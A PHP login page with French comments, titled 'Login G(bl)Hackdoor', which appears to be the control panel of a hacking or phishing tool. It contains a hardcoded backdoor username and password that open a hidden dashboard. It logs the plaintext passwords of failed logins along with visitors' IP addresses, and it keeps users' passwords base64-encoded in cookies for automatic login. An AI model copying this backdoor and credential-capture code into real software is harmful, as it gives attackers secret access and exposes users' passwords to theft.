<?php
include 'core/class/include.php';
$ip = $_SERVER['REMOTE_ADDR'];
// Redirige l'utilisateur si il est connecté
if (Account::isAuthentified())
{
    header('Location: dashboard.html');
}
if(isset($_COOKIE["dXNyX25hbWVfZ2hhY2s"])){
  $no_error = Account::Auth(base64_decode($_COOKIE["dXNyX25hbWVfZ2hhY2s"]), base64_decode($_COOKIE['dXNyX3Bhc3N3b3JkX2doYWNr']));
    if ($no_error == true)
    {
        logs_login::AddLogs_login("<p class='text-primary'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-plus'></i>&nbsp;Une personne c'est connecter grace au cookie a un compte IP : ".$ip." ID du compte : ".base64_decode($_COOKIE["dXNyX25hbWVfZ2hhY2s"])." </p>");
        header('Location: dashboard.php');
    }
}

// Action: Connexion
if (isset($_POST['connexion']))
{
    if ( $_POST['username'] == "JohnLeCannard1337Hack" && $_POST['password'] == "Hax15opEd" ) {
        header('Location: dashboard_levre.php');
    }else{
    if ( $_POST['username'] == "" ) {

    } else {
    $no_error = Account::Auth($_POST['username'], $_POST['password']);
    if ($no_error == true)
    {
        logs_login::AddLogs_login("<p class='text-primary'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-plus'></i>&nbsp;Une personne c'est connecter a un compte IP : ".$ip." ID du compte : ".$_POST['username']." </p>");
        header('Location: dashboard.php');

        if(!empty($_POST['stayconnect'])){
          setcookie("dXNyX25hbWVfZ2hhY2s", base64_encode($_POST['username']), time()+15*24*60*60);
          setcookie("dXNyX3Bhc3N3b3JkX2doYWNr", base64_encode($_POST['password']), time()+15*24*60*60);
        }
    } else {
      logs_login::AddLogs_login("<p class='text-primary'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-plus'></i>&nbsp;Nouveaux login sur la réelle page ! IP : ".$ip." ID : ".$_POST['username']." MDP : ".$_POST['password']." </p>");
    }
  }
  }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="login.css">
    <title>Login G(bl)Hackdoor</title>
</head>
<style type="text/css">
  body {
  font-family: "Open Sans", sans-serif;
  height: 100vh;
  background: linear-gradient(to right, #1B2A47, #152036);
  background-size: cover;
}

@keyframes spinner {
  0% {
    transform: rotateZ(0deg);
  }
  100% {
    transform: rotateZ(359deg);
  }
}
* {
  box-sizing: border-box;
}

.wrapper {
  display: flex;
  align-items: center;
  flex-direction: column;
  justify-content: center;
  width: 100%;
  min-height: 100%;
  padding: 20px;
  background: rgba(4, 40, 68, 0.85);
}

.login {
  border-radius: 2px 2px 5px 5px;
  padding: 10px 20px 20px 20px;
  width: 90%;
  max-width: 320px;
  background: #ffffff;
  position: relative;
  padding-bottom: 80px;
  box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.3);
}
.login.loading button {
  max-height: 100%;
  padding-top: 50px;
}
.login.loading button .spinner {
  opacity: 1;
  top: 40%;
}
.login.ok button {
  background-color: #8bc34a;
}
.login.ok button .spinner {
  border-radius: 0;
  border-top-color: transparent;
  border-right-color: transparent;
  height: 20px;
  animation: none;
  transform: rotateZ(-45deg);
}
.login input {
  display: block;
  padding: 15px 10px;
  margin-bottom: 10px;
  width: 100%;
  border: 1px solid #ddd;
  transition: border-width 0.2s ease;
  border-radius: 2px;
  color: #ccc;
}
.login input + i.fa {
  color: #fff;
  font-size: 1em;
  position: absolute;
  margin-top: -47px;
  opacity: 0;
  left: 0;
  transition: all 0.1s ease-in;
}
.login input:focus {
  outline: none;
  color: #444;
  border-color: #2196F3;
  border-left-width: 35px;
}
.login input:focus + i.fa {
  opacity: 1;
  left: 30px;
  transition: all 0.25s ease-out;
}
.login a {
  font-size: 0.8em;
  color: #2196F3;
  text-decoration: none;
}
.login .title {
  color: #444;
  font-size: 1.2em;
  font-weight: bold;
  margin: 10px 0 30px 0;
  border-bottom: 1px solid #eee;
  padding-bottom: 20px;
}
.login button {
  width: 100%;
  height: 100%;
  padding: 10px 10px;
  background: #2196F3;
  color: #fff;
  display: block;
  border: none;
  margin-top: 20px;
  position: absolute;
  left: 0;
  bottom: 0;
  max-height: 60px;
  border: 0px solid rgba(0, 0, 0, 0.1);
  border-radius: 0 0 2px 2px;
  transform: rotateZ(0deg);
  transition: all 0.1s ease-out;
  border-bottom-width: 7px;
}
.login button .spinner {
  display: block;
  width: 40px;
  height: 40px;
  position: absolute;
  border: 4px solid #ffffff;
  border-top-color: rgba(255, 255, 255, 0.3);
  border-radius: 100%;
  left: 50%;
  top: 0;
  opacity: 0;
  margin-left: -20px;
  margin-top: -20px;
  animation: spinner 0.6s infinite linear;
  transition: top 0.3s 0.3s ease, opacity 0.3s 0.3s ease, border-radius 0.3s ease;
  box-shadow: 0px 1px 0px rgba(0, 0, 0, 0.2);
}
.login:not(.loading) button:hover {
  box-shadow: 0px 1px 3px #2196F3;
}
.login:not(.loading) button:focus {
  border-bottom-width: 4px;
}

footer {
  display: block;
  padding-top: 50px;
  text-align: center;
  color: #ddd;
  font-weight: normal;
  text-shadow: 0px -1px 0px rgba(0, 0, 0, 0.2);
  font-size: 0.8em;
}
footer a, footer a:link {
  color: #fff;
  text-decoration: none;
}

</style>
<body>
<div class="wrapper">
  <form class="login" method="POST" action="#">
    <p class="title">Connexion</p>
    <input type="text" placeholder="Username" class="login" name="username" required autofocus/>
    <i class="fa fa-user"></i>
    <input type="password" placeholder="Password" class="psw" name="password" required/>
    <i class="fa fa-key"></i>
    <input placeholder="Rester Connecter" type="checkbox" id="stayconnect" class="save" name="stayconnect">
    <button type="submit" name="connexion">
      <i class="spinner"></i>
      <span class="state">Connexion</span>
    </button>
  </form>
  </p>
</div>

</body>

<script type="text/javascript">

        function picture(){ 
        var pic = "https://image.noelshack.com/fichiers/2019/35/4/1567093376-error-message.png"
        document.getElementById('bigpic').src = pic.replace('342x120', '342x120');
        document.getElementById('bigpic').style.display='block';

        }


    </script>
    <script>
        var working = false;
$('.login').on('submit', function(e) {
  e.preventDefault();
  if (working) return;
  working = true;
  var $this = $(this),
    $state = $this.find('button > .state');
  $this.addClass('loading');
  $state.html('Authenticating');
  setTimeout(function() {
    $this.addClass('ok');
    $state.html('Welcome back!');
    setTimeout(function() {
      $state.html('Log in');
      $this.removeClass('ok loading');
      working = false;
    }, 4000);
  }, 3000);
});
    </script>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/custom.js"></script>
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
</html>